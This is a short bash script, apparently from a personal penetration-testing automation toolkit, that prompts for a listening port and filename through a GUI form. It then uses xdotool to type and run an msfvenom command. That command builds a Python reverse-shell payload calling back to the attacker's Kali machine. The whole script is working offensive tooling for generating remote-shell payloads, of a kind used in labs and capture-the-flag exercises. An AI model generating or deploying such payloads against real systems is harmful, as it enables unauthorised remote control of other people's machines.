#!/bin/bash

: '
Create Python file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "filename"

LPORT=${form_data["LPORT"]}
FILE=${form_data["filename"]}

paste_command "msfvenom -p cmd/unix/reverse_python LHOST=${KALI_IP} LPORT=${LPORT} -f raw -o ${FILE}.py"
xdotool key Return
